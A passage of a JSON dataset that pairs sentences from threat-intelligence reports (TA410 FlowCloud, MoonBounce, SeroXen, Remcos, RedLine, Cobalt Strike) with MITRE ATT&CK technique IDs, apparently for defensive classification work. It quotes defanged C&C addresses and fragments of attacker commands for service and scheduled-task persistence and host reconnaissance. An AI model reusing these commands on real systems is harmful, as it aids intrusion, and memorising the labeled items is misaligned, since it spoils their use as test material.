    "text": "ChildProcessListener: Injects the rootkit to a newly created process by another process and updates the callee via NamedPipe. Figure 7.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The control code that executes a file using ShellExecute. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "CONTROL_USER_RUNPE The control code that executes an executable using process hollowing. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The DLL rootkit carries out process injections, executes commands received by other processes, and keeps out of sight any sign of SeroXen being executed within the system. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Since Seroxen is based on QuasarRAT, the C&C server utilizes the same Common Name in their TLS certificate.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The functionalities offered by the threat actor for the C&C server closely mirror those found in the Quasar Github repository, including support for TCP network streams (both IPv4 and IPv6), efficient network serialization, compression using QuickLZ, and secure communication through TLS encryption. Figure 10.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring clipboard events to steal clipboard content. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Monitoring file system events to collect new and modified files. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&C server communications. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "These were either dropped directly via the webshell or downloaded from a remote server using certutil.exe, a known LOLBin. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (HTran, LCX, EarthWorm), and lateral movement scripts such as WMIExec. Arsenal TA410 – FlowingFrog FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The following files are downloaded and written to disk: http://103.139.2[.]93:1702/tdr.dat written to %localappdata%\\Tendyron\\Tendyron.exe (SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550) http://103.139.2[.]93:1702/okt.dat written to %localappdata%\\Tendyron\\OnKeyToken_KEB.dll (SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) http://103.139.2[.]93:1702/md.dat written to %localappdata%\\Tendyron\\Tendyron.conf (we were not able to retrieve this file) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "On VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first stage is responsible mostly for creating the files and registry keys used by the other stages.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Contents of the dropper’s resources Resource IDRoleInternal name 100FlowCloud RAT DLLfcClientDll 10132-bit rootkit driverDriver 10264-bit rootkit driverDriver 103DLL hijacking vulnerable appN/A 104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore 105Shellcode that loads fcClient (unused)N/A 106Final dropper stagefcClient 10732-bit persistence modulefcClientWD_x86 10864-bit persistence modulefcClientWD_x64 109Legitimate library used for module stompingslam 110DLL used for hijackingXXXModule_dlcore0 1000Protobuf serialized FlowCloud configurationN/A 1001Dropper configurationN/A 2000Used as an alternative or extension to resource 2001N/A 2001Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000Installation configurationN/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "In the former case, the task or service attains persistence by being set to start automatically on boot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "First, persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This task will run the DLL hijacking target as SYSTEM at each boot. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "A hidmouse service is then created to run that module and is immediately started.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "FlowCloud then starts a suspended process to perform injection on it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Meanwhile, the injection process is terminated. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Hardcoded, fake HTTP POST request used for FlowCloud C&C communication This component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key.",
    "command": "",
    "labels": [
      "T1012",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&C commands, while those whose names end with manager automatically perform actions based on timers or event listeners. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&C server.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The corresponding files are collected unless they are excluded by that policy. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This same class collects file and directory metadata. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Simplified code showing how the IShellAppManager COM interface is used to list installed applications Other commands can be used to retrieve a detailed list of available services and currently running processes. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW. Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Exits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "They can be invoked via IO control codes or by writing to specific registry keys. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It checks running processes for executables of several known cybersecurity vendors.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Unfortunately, we were not able to uncover any persistence method. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The loader injects an orchestrator into memory in a svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\rsa.txt.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It is encrypted using the AES algorithm and stored in the Windows registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Table 2 shows the three registry keys used by X4. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Network shellcode registry keys Registry KeyDescription HKLM\\SOFTWARE\\Microsoft\\DRM\\X4KeyAES key. HKLM\\SOFTWARE\\Microsoft\\DRM\\PSKeyName of the process into which the shellcode will be injected (spoolsv.exe). HKLM\\SOFTWARE\\Microsoft\\DRM\\X4DataEncrypted shellcode. ",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "0x3F5FB1E6015pslistList the running processes using CreateToolhelp32Snapshot and Process32Next. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "0x3B6C27610D1injectDecrypt and inject shellcode, from encrypted form on disk, into memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "0xDA83E71execExecute a given command line. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "0xE9478DCliveGet the PID of the process in which the orchestrator is running. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This is sent to the server along with the computer’s name and the configuration data.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Communication protocol LookBack can communicate over HTTP or via its “normal protocol”.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "42ServerTransfer file to client in message body (response to message 41) ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Template used for HTTP client requests On the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF image. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Template used for HTTP server responses TA410 – JollyFrog This third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Digital signature of the QuasarRAT downloader This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server http://ffca.caibi379[.]com, at /rwjh/new/.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ExecutionT1106Native APIFlowCloud makes extensive use of the Windows API to execute commands and launch processes. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "T1559.001Inter-Process Communication: Component Object ModelFlowCloud uses COM interfaces to schedule tasks and perform WMI queries. ",
    "command": "",
    "labels": [
      "T1047",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "T1047Windows Management InstrumentationTA410 uses WMI for lateral movement and information gathering. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "PersistenceT1053.005Scheduled Task/Job: Scheduled TaskFlowCloud creates a scheduled task for persistence. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows ServiceFlowCloud can be configured to create a service for persistence. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "T1055.001Process Injection: Dynamic-link Library InjectionFlowCloud uses both regular and reflective DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "T1055Process InjectionTA410’s backdoors perform process injection to masquerade as harmless processes. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "T1070.004Indicator Removal on Host: File DeletionFlowCloud deletes its rootkit’s executable after launching it. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "DiscoveryMultiple TA410 backdoors can list running processes. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "T1083File and Directory DiscoveryFlowCloud can search through connected file systems and obtain directory listings. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "T1012Query RegistryFlowCloud components use registry keys to signal each other. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "T1074.001Data Staged: Local Data StagingFlowCloud stores collected data in local SQLite databases prior to exfiltration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "T1005Data from Local SystemFlowCloud can exfiltrate files from local file systems. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Command And ControlT1071.001Application Layer Protocol: Web ProtocolsLookBack and FlowCloud can send and receive data over HTTP. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "ExfiltrationT1030Data Transfer Size LimitsFlowCloud uses local caches to stage data and exfiltrates their content when it reaches a size specified in its configuration. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Among other things, it collects usernames, hostnames, and directory listings.",
    "command": "",
    "labels": [
      "T1033",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It also fetches commands that are set for execution using scheduled tasks or cronjob, depending on the host platform. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4: Code responsible for downloading cron_script file A misconfigured web host gives up the goods Given the malware’s reliance on remote C2 infrastructure, it made sense to scout out the web host used in the attack to get more information about the malware’s capabilities.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "However, we can confirm that developers did install the malicious PyPI package and that their machine names, usernames, and directory listings were harvested as a result. ",
    "command": "",
    "labels": [
      "T1033",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce; Due to its emplacement on SPI flash which is located on the motherboard instead of the hard disk, the implant is capable of persisting in the system across disk formatting or replacement; The purpose of the implant is to facilitate the deployment of user-mode malware that stages execution of further payloads downloaded from the internet; The infection chain itself does not leave any traces on the hard drive, as its components operate in memory only, thus facilitating a fileless attack with a small footprint; We detected other non-UEFI implants in the targeted network that communicated with the same infrastructure which hosted the the stager’s payload; By assessing the combination of the above findings with network infrastructure fingerprints and other TTPs exhibited by the the attackers; to the best of our knowledge the intrusion set in question can be attributed to APT41, a threat actor that’s been widely reported to be Chinese-speaking; In this report we describe in detail how the MoonBounce implant works, how it is connected to APT41, and what other traces of activity related to Chinese-speaking actors we were able to observe in the compromised network that could indicate a connection to this threat actor and the underlying campaign. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This driver, which runs during the initial phases of the kernel’s execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e. hxxp://mb.glbaitech[.]com/mboard.dll) and attempts to fetch another stage of the payload to run in memory, which we were not able to retrieve. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is an in-memory implant, implemented as position-independent code, that can communicate to a C2 server in order to exchange information and stage the execution of additional plugins in memory, of which none has been sighted in the wild yet.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In one case, we observed such altered wbemcomn.dll (MD5: C3B153347AED27435A18E789D8B67E0A) file, which originally facilitates the functionality of WMI in Windows and was located in the directory %SYSTEM%\\wbem.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "As a consequence, when the WMI service was initiated, the rogue version of this DLL forced the loading of a StealthVector image named wmiwk.dll. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Appended IAT entry to a rogue wbemcomn.dll file which forces the loading of StealthVector upon initiation of the WMI service The table below specifies all instances of StealthVector that we detected in the targeted network, along with timestamp artefacts that might point to the date of their creation. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "It works by decrypting a shellcode BLOB with AES-256 and injecting it to the address space of another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected process in every case we observed was msdt.exe (Microsoft Diagnostic Troubleshooting Wizard). ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first way is by executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This is outlined in the following commands typed by the attackers on one of the compromised systems:net start \"iscsiwmi\" sc stop iscsiwmi sc delete iscsiwmi reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "\"iscsiwmi\" /f sc create \"iscsiwmi\" binPath= \"$system32\\svchost.exe -k iscsiwmi\" type= share start= auto error= ignore DisplayName= \"iscsiwmi\" SC failure \"iscsiwmi\" reset= 86400 actions= restart/60000/restart/60000/restart/60000 sc description \"iscsiwmi\" \"\"iSCSI WMI Classes That Manage Initiators, Ports, Sessions and Connections\"\" reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\iscsiwmi\\Parameters\" /v",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The utility itself is a basic C++ program that achieves the aforementioned goal by issuing the following command line using the WinExec API:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
    "command": "",
    "labels": [
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Watch.targets ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The second way to execute StealthMutant is through the creation of a scheduled task via a Windows batch script file named schtask.bat, as outlined below:@echo off cd /d",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "NET\\Framework64\\v4.0.30319\\MstUtil.exe.config\" schtasks /create",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "/TN \"\\Microsoft\\Windows\\UNP\\UNPRefreshListTask\" /SC ONSTART /TR",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "/F /DELAY 0000:02 /RU SYSTEM /RL HIGHEST schtasks /run",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The implants we observed in this campaign are shipped as DLLs that ought to run in the context of exe, with the primary intent of reading a C2 address from an encrypted configuration file stored in %WINDIR%\\debug\\netlogon.cfg and reaching out to the server to obtain a further payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The IP and directory path tuple are used during execution for: Initialising communications with the server; Sending information from the infected host; Requesting a specific server path containing a command for execution and downloading it; ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The following are examples of command lines that portray some of the methods and actions taken by the operators of this threat activity to achieve their goals: Attempts to enumerate hosts and gather network information: cmd /C",
    "command": "",
    "labels": [
      "T1033",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"C: & cd \\ & whoami\" cmd /C",
    "command": "",
    "labels": [
      "T1033",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"C: & cd \\ & systeminfo\" Copying of files across SMB shares, followed by an attempt to dump the Active Directory domain database (tid): cmd /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "\"C: & cd \\ & type $temp\\silconfig.log\" File archiving of remotely collected files, some of which contain *.hive files, possibly for LSA secrets dumping, with the exe command line utility: cmd /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1 - Infection chain Technical Analysis MSBuild MSBuild is a development tool used for building applications, especially where Visual Studio is not installed.[2] MSBuild uses XML project files that contain the specifications to compile the project and, within the configuration file, the “UsingTask” element defines the task that will be compiled by MSBuild.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "In addition, MSBuild has an inline task feature that enables code to be specified and compiled by MSBuild and executed in memory.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "For persistence, mshta is used to execute a vbscript that runs the project file, with a shortcut file (.lnk) added to the startup folder (Figure 3). ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After being copied into memory, the shellcode was executed using the callback function pointer in CallWindowProc, shown in Figure 6 below.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 6 - Shellcode and Payload Being Loaded Into Memory Figure 7 - Encoded shellcode in Project File The shellcode (encoded shown in Figure 7 above) calls, shown in Figure 8 below, were mainly: LoadLibraryW, VirtualAlloc, CreateProccessW, and ZwUnmapViewOfSection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "LoadLibraryW loads the module, VirtualAlloc allocates the memory, CreateProcessW created a process, and ZwUnmapViewOfSection is used to unmap memory from a virtual space.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "These were used to inject the payload into process memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The software, written in C++, enables full access to the infected machine with features including, but not limited to: Anti-AV Credential harvesting Gathering system information Keylogging Persistence Screen capture Script execution The themes used by actors to distribute Remcos have varied, including changes designed to adapt to themes or timeframes.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The persistence technique is simply adding a run registry key for persistence (Figure 11).",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 9 - Remcos Version 2.6.0 Being Used Figure 10 - connecting to C2 Figure 11 - Adds Run Registry Key for Persistence Figure 12 - Watchdog Module Figure 12 shows the “Watchdog” module which restarts Remcos in the event the program is terminated. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Webcam Capture Remote Command Line Clear Logins Remote Chat File Manager Remote Input Microphone Capture SOCKS Proxy Keylogger Login Cleaner Screen Logger Local Utilities Browser History Registry Editor Password Recovery Visibility mode RedLine Stealer Analyzed File – rehoboams.exe MD5 – 6d3e8a2802848d259a3baaaa78701b97 ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "RedLine Stealer is written in .NET and has been observed stealing multiple types of data (full list shown in Table 2 below), including: : Cookies Credentials (chat clients, VPNs, crypto wallets, browser ) ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Crypto wallet NordVPN (existence of and credentials) Stored web browser information (credit card, username, and password) ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "System Information RedLine will search for the existence of multiple products that include cryptocurrency software, messaging apps, VPNs, and web browsers (full list shown in Table 2 below). ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Beacon payload is used to model advanced APT malware, and can do the following: Receive commands (either passively or from an interactive console) Egress communications over HTTP, HTTPS, and DNS Launch PowerShell Execute binaries Modify and query the Windows registry Inject malicious code into legitimate processes Log keystrokes Take screenshots Set up proxies Escalate privileges Bypass UAC Dump password hashes Scan ports among other abilities This tool is mainly used in red team operations for government agencies and private enterprises, but it’s also a popular tool leveraged by cybercrime and APT groups in cracked versions.",
    "command": "",
    "labels": [
      "T1012",
      "T1055",
      "T1071.001",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The TEARDROP dropper is a memory-only DLL that runs as a service spawning a thread that pulls the Cobalt Strike payload from a fake JPG file.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The payload, usually shellcode, is injected into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The shellcode is then executed in a new thread. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An endpoint with a system injected with Cobalt Strike via MSBuild is shown below.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
